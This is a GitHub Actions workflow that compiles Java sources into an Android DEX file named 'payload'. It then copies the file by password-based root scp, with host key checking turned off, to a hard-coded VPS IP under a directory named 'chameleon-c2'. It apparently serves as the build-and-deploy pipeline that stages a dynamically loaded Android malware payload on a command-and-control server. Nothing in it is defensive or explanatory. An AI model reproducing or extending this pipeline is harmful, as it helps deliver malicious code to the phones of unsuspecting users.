name: Build Payload DEX

on:
  push:
    branches: [main]
    paths:
      - 'payload-src/**'
  workflow_dispatch:

jobs:
  build-dex:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: 17
          distribution: 'temurin'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      - name: Find Android platform JAR
        run: |
          ANDROID_JAR=$(find $ANDROID_HOME/platforms -name "android.jar" | head -1)
          echo "ANDROID_JAR=$ANDROID_JAR" >> $GITHUB_ENV
          echo "Using: $ANDROID_JAR"

      - name: Compile payload source
        run: |
          mkdir -p build/payload-classes
          find payload-src -name "*.java" > sources.txt
          javac -cp $ANDROID_JAR -d build/payload-classes @sources.txt

      - name: Package as JAR
        run: |
          cd build/payload-classes
          jar cf ../payload.jar .
          echo "JAR size: $(du -h ../payload.jar | cut -f1)"

      - name: Convert to DEX
        run: |
          D8=$(find $ANDROID_HOME/build-tools -name "d8" | head -1)
          echo "Using: $D8"
          $D8 --lib $ANDROID_JAR --output build/payload.dex build/payload.jar
          echo "DEX size: $(du -h build/payload.dex | cut -f1)"

      - name: Upload DEX artifact
        uses: actions/upload-artifact@v4
        with:
          name: payload-dex
          path: build/payload.dex
          if-no-files-found: error

      - name: Deploy to VPS via rsync
        if: github.ref == 'refs/heads/main'
        env:
          VPS_HOST: 77.105.133.37
          VPS_PASS: ${{ secrets.VPS_PASSWORD }}
        run: |
          apt-get update -qq && apt-get install -y -qq sshpass 2>/dev/null
          sshpass -p "$VPS_PASS" scp -o StrictHostKeyChecking=no build/payload.dex root@$VPS_HOST:/opt/chameleon-c2/data/payload.dex
          echo "Deployed to VPS"
